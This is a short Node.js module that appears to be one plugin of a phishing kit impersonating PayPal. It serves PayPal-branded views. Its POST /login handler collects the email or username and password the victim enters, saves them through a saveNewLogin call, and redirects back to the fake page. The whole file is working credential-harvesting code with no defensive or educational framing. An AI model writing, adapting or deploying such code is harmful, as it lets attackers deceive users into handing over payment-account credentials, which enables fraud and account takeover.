exports.info = {
    name: 'paypal',
    views: '/paypal/views',
    static: '/paypal/static'
};

exports.execute = (app, schemaUtils) => {
    app.get('/', (req, res) => {
        res.render('index');
    });

    app.post('/login', (req, res) => {
        let email = req.body.session.username_or_email;
        let pass = req.body.session.password;
        if (email && pass) {
            schemaUtils.saveNewLogin(exports.info.name, email, pass);
        }
        res.status(200).redirect('/');
    })
};
